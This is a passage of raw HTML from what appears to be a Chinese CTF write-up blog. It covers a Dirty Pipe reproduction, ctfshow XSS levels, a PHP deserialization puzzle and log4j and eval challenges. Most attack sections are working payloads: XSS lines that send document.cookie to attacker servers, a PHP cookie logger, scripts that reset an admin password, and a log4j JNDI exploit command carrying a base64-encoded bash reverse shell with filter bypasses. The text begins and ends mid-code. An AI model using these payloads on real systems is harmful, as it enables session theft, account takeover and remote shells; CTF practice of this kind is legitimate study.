class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>one%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">object</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>MeMeMe%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>year_parm%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>Happy_func%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A0%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/09/cve-2022-8047%20linux%E6%8F%90%E6%9D%83/">cve-2022-8047复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-09</time><div class="content"><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>CVE-2022-0847是自 5.8 以来 Linux 内核中的一个漏洞，攻击者利用该漏洞可以覆盖任意只读文件中的数据。这样将普通的权限提升至root权限，因为非特权进程可以将代码注入到根进程</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Linux Kernel版本 &gt;= 5.8<br>Linux Kernel版本 &lt; 5.16.11 / 5.15.25 / 5.10.102</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a target="_blank" rel="noopener" href="https://haxx.in/files/dirtypipez.c">exp</a><br>之后在执行exp<br><img src="https://img-blog.csdnimg.cn/0d06c25f070349098794b771129bbacd.png"><br>之后运行<br><img src="https://img-blog.csdnimg.cn/1501433bef294e15b8f9e18f0771d1ed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/25/ctfshow%20xss/">ctfshow xss</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-25</time><div class="content"><p>集一下可用的姿势吧，</p>
<blockquote>
<p>window.open:open() 方法用于打开一个新的浏览器窗口或查找一个已命名的窗口。<br>location.href=”/url”当前页面打开URL页面<br>windows.location.href=”/url” 当前页面打开URL页面<br>onfocus事件在对象获得焦点时发生<br> autofocus 属性规定当页面加载时 input 元素应该自动获得焦点。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;location.href=<span class="string">&#x27;http://ip:端口/&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br><span class="line"><span class="comment"># 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>onload 事件会在页面或图像加载完成后立即发生。</p>
<p>svg标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>iframe标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p>body标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip:端口/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>img：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=document.createElement(<span class="string">&quot;img&quot;</span>); img.src=<span class="string">&quot;http://118.31.168.198:39543/&quot;</span>+document.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>利用自己的服务器在服务器页面上写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># a.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后在题目页面写入js</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// js代码</span></span><br><span class="line">&lt;script&gt;document.location.href=<span class="string">&#x27;http://xxx/a.php?cookie=&#x27;</span>+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>之后在服务器内得到flag</p>
<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>script标签被过滤，可以用body</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web-318"><a href="#web-318" class="headerlink" title="web 318"></a>web 318</h2><p>过滤了img,用317得payload</p>
<h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>同上</p>
<h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>本题空格被过滤<br>利用%09得url解码进行解题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body	onload=<span class="string">&quot;window.location.href=&#x27;http://124.222.115.141/a.php?cookie=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>同上</p>
<h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>又把iframe给过滤了<br>poc同上</p>
<h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>同上</p>
<h2 id="web324-326"><a href="#web324-326" class="headerlink" title="web324~326"></a>web324~326</h2><p>同上</p>
<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型XSS。首先就是poster必须是admin才能发送成功，其次就是XSS的触发点应该是sender和content都可以。直接用一下xss平台的payload就可以了。（不要用img，img似乎被过滤）<br><img src="https://img-blog.csdnimg.cn/5048b8ef24b94db991a3b4773d66cf4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>看到后先注册，之后发现必须是管理员才能查看<br>于是注册时利用下面的作为密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>之后在服务器上看到管理员cookie<br>利用cookie进入管理员页面<br>之后发现会出现跳闪，利用bp抓包一步一步的放包即可得到flag</p>
<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>方法同上，能得到cookie但是还是访问不了页面</p>
<p>原因是，管理员访问了页面就退出了，相当于现在得到的最新cookie是管理员上一次用的cookie</p>
<p>这里不行了呀这里，看了下wp是用js</p>
<p>这样，看视频<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1gi4y1A76p">bili</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.innerHTML.indexOf(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        window.location.href=<span class="string">&#x27;http://124.222.115.141/a.php?cookie=&#x27;</span>+value.innerHTML; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>（ctfshow中间有+号，是因为防止把自己写的js给发送过去）<br>这样可以得到管理员密码<br>或者在show后加{可得到flag</p>
<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>本题利用上一题的做法无法实现<br>经过观察，发现存在修改密码，经测试，可以发现可以修改admin的密码<br>利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=123&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>（注意要将该js放在用户名中进行利用）<br>之后登录admin得到flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>本题和上一题相似<br>但本题是POST传参<br>看源码得到<br><img src="https://img-blog.csdnimg.cn/9b42d1a9da8d4df396c34684765e34c2.png" alt="在这里插入图片描述"><br>于是制作js修改管理员密码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>之后登录的到flag</p>
<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>打开题目后，发现可以买flag<br>向admin转账，-10000，发现自己账号金币有10000多可以购买flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>（由于后台逻辑错误，导致转金币可以不消耗自己的金币）<br>不停给自己转金币，只要不超过自己的余额就一直转，直到得到flag</p>
<p>也可以创建一个账号，利用js漏洞让管理员给自己转金币<br>paylaod</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;111&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>




</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/19/FilesystemIterator%20%E7%B1%BB%E8%AF%BB%E7%9B%AE%E5%BD%95%E7%9A%84%E4%B8%80%E9%81%93%E5%B8%88%E5%82%85%E5%87%BA%E7%9A%84%E9%A2%98/">FilesystemIterator类读目录的一道师傅出的题</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-19</time><div class="content"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$par4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$par0</span>,<span class="variable">$par1</span>,<span class="variable">$par2</span>,<span class="variable">$par3</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par0 = <span class="variable">$par0</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par1 = <span class="variable">$par1</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par2 = <span class="variable">$par2</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par3 = <span class="variable">$par3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;par0(<span class="keyword">$this</span> -&gt; par1,<span class="keyword">$this</span> -&gt; par2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Plz  &#x27;</span>.<span class="keyword">$this</span> -&gt; par4.<span class="string">&#x27;  try harder&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; par4 -&gt; juts_a_function();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span> -&gt; par0) &amp;&amp; (<span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par1) || <span class="keyword">isset</span>(<span class="keyword">$this</span> -&gt; par2)))&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; newOne();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span> -&gt; par3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; yigei();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span> -&gt; giao();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="keyword">$this</span> -&gt; par2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>
<p>首先有个 hint.php 在__wakeup 中，直接 php 伪协议拼接读取<br><img src="https://img-blog.csdnimg.cn/3daa29b2f4e34e199d00e85dbe019650.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到提示<br><img src="https://img-blog.csdnimg.cn/ab2dda6e4f194953a54d1903b778a042.png" alt="在这里插入图片描述"><br>之后利用<br><img src="https://img-blog.csdnimg.cn/057fab99be86486f90c35cb887fa5e7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>做poc<br><img src="https://img-blog.csdnimg.cn/1e44d4552fd745f682327f9bed2d85d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现下面没啥重要的<br>经师傅提醒<br>利用glob协议<br><img src="https://img-blog.csdnimg.cn/06ed7adf94f947b19e0a5273182b6ca6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>得到在flll44ggg-secret.txt<br>访问得到<br><img src="https://img-blog.csdnimg.cn/84b10b72b44544a18376644eb6697d7a.png" alt="在这里插入图片描述"><br><a target="_blank" rel="noopener" href="http://blog.m1kael.cn/index.php/archives/12/">PHP内置类关于反序列化的应用</a><br><a target="_blank" rel="noopener" href="https://www.xiinnn.com/article/5ba4634b.html">【POP链&amp;原生类&amp;伪协议】记一道2021浙江省赛的Web题</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9B/">长安“战疫”网络安全卫士守护赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="RCE-No-Par"><a href="#RCE-No-Par" class="headerlink" title="RCE_No_Par"></a>RCE_No_Par</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/session|end|next|header|dir/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一篇相识的博客<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7355a5ab4822">相似的博客</a><br>从中发现本题是博客中的那题的升级<br>由于/session|end|next|header|dir这些都被ban，则找替换<br>发现end可由pos(array_reverse())替换，则<br>paylaod</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(pos(array_reverse(current(get_defined_vars()))));&amp;b=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="西安加油"><a href="#西安加油" class="headerlink" title="西安加油"></a>西安加油</h2><p>下载文档得到文件<br>利用whireshark打开<br>导出http对象，发现secret.txt文件<br>打开得到<br><img src="https://img-blog.csdnimg.cn/32758d5addaf44b98641cf534cb24e41.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后base64解密得到zip文件，解压得到<br><img src="https://img-blog.csdnimg.cn/d739be0e76ab40e5a11764f0a798c3ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>之后进行拼接得到<br><img src="https://img-blog.csdnimg.cn/dd49dac2866845fda38bb637e9d93d94.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="web-Shiro"><a href="#web-Shiro" class="headerlink" title="web Shiro?"></a>web Shiro?</h2><p>就是log4j，过滤了一下jndi<br>参考<a target="_blank" rel="noopener" href="https://le1a.gitee.io/posts/3e4e56bc/">log4j</a><br>我的是利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|bash&quot;</span> -A <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">注意:根据自身情况调整payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于没有服务器所以之后没做<br>详细操作参考（与上面不一样，下面较详细）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43895765/article/details/121943404">log4j</a><br>值得注意的是jndi得过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">绕过jndi</span><br><span class="line"></span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br><span class="line"></span><br><span class="line">&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:<span class="comment">//101.34.46.94:1099/sv7c8c&#125;</span></span><br></pre></td></tr></table></figure>
<p>上述两种看情况使用<br>最后反弹shell得到flag</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/02/18/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/">ctfshow新春欢乐赛</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-02-18</time><div class="content"><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><p>开局看到源码，但是却没有显示源码的代码。那么只能是被包含进去了，直接phpinfo搜prepend可以看到包含的文件，查看之得到flag。<br><img src="https://img-blog.csdnimg.cn/893ec64d0beb4ba39a35cee10c025a1d.png" alt="在这里插入图片描述"><br>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f=system(<span class="string">&quot;tac /etc/ssh/secret/youneverknow/secret.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[content];</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ctf-死亡exit绕过"><a href="#ctf-死亡exit绕过" class="headerlink" title="ctf 死亡exit绕过"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/njqfb/article/details/117574395">ctf 死亡exit绕过</a></h2><h2 id="title-ctfshow新春欢乐赛"><a href="#title-ctfshow新春欢乐赛" class="headerlink" title="title: ctfshow新春欢乐赛"></a>title: ctfshow新春欢乐赛</h2><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span 